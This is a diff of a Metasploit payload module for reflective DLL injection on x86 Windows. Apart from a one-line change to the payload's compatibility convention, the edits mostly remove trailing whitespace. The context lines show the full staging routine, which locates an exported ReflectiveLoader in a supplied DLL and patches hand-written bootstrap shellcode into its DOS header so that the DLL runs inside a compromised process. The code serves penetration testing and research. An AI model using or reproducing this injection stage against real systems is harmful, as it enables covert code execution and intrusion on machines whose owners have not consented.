@@ -25,20 +25,20 @@ module Payload::Windows::ReflectiveDllInject
 			'References'    => [ [ 'URL', 'http://www.harmonysecurity.com/ReflectiveDllInjection.html' ] ],
 			'Platform'      => 'win',
 			'Arch'          => ARCH_X86,
-			'PayloadCompat' => 
-				{ 
-					'Convention' => 'sockedi'
+			'PayloadCompat' =>
+				{
+					'Convention' => 'sockedi -passivex',
 				},
-			'Stage'         => 
-				{ 
-					'Offsets' => 
-						{ 
-							'EXITFUNC' => [ 33, 'V' ] 
-						}, 
-					'Payload' => "" 
+			'Stage'         =>
+				{
+					'Offsets' =>
+						{
+							'EXITFUNC' => [ 33, 'V' ]
+						},
+					'Payload' => ""
 				}
 			))
-      
+
 		register_options( [ OptPath.new( 'DLL', [ true, "The local path to the Reflective DLL to upload" ] ), ], self.class )
 	end
 
@@ -49,12 +49,12 @@ module Payload::Windows::ReflectiveDllInject
 	def stage_payload
 		dll    = ""
 		offset = 0
-    
+
 		begin
 			File.open( library_path, "rb" ) { |f| dll += f.read }
 
 			pe = Rex::PeParsey::Pe.new( Rex::ImageSource::Memory.new( dll ) )
-      		
+
 			pe.exports.entries.each do |entry|
 				if( entry.name =~ /^\S*ReflectiveLoader\S*/ )
 					offset = pe.rva_to_file_offset( entry.rva )
@@ -62,14 +62,14 @@ module Payload::Windows::ReflectiveDllInject
 				end
 			end
 
-			raise "Can't find an exported ReflectiveLoader function!" if offset == 0 
+			raise "Can't find an exported ReflectiveLoader function!" if offset == 0
 		rescue
 			print_error( "Failed to read and parse Dll file: #{$!}" )
 			return
 		end
-		
+
 		exit_funk = [ @@exit_types['thread'] ].pack( "V" ) # Default to ExitThread for migration
-		
+
 		bootstrap = "\x4D" +                            # dec ebp             ; M
 					"\x5A" +                            # pop edx             ; Z
 					"\xE8\x00\x00\x00\x00" +            # call 0              ; call next instruction
@@ -89,21 +89,21 @@ module Payload::Windows::ReflectiveDllInject
 					"\x68\x05\x00\x00\x00" +            # push 0x5            ; signal we have detached
 					"\x50" +                            # push eax            ; some value for hinstance
 					"\xFF\xD3"                          # call ebx            ; call DllMain( somevalue, DLL_METASPLOIT_DETACH, exitfunk )
-					
+
 		# sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
 		if( bootstrap.length > 62 )
 			print_error( "Reflective Dll Injection (x86) generated an oversized bootstrap!" )
 			return
 		end
-		
+
 		# patch the bootstrap code into the dll's DOS header...
 		dll[ 0, bootstrap.length ] = bootstrap
-		
+
 		# return our stage to be loaded by the intermediate stager
 		return dll
 	end
-  
+
 end
 
-end 
+end
 
